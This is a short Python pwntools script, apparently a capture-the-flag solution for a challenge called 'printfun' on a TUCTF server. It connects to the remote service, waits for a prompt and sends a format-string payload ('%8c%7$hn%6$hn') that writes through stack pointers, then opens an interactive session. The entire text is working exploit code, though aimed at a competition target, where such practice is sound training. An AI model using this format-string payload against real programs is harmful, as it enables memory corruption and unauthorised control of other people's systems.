from pwn import *
context.log_level='debug'

#p = process('printfun')
p = remote("chal.tuctf.com",30501)

p.recvuntil('? ')
#gdb.attach(p)
p.sendline("%8c%7$hn%6$hn")

p.interactive()
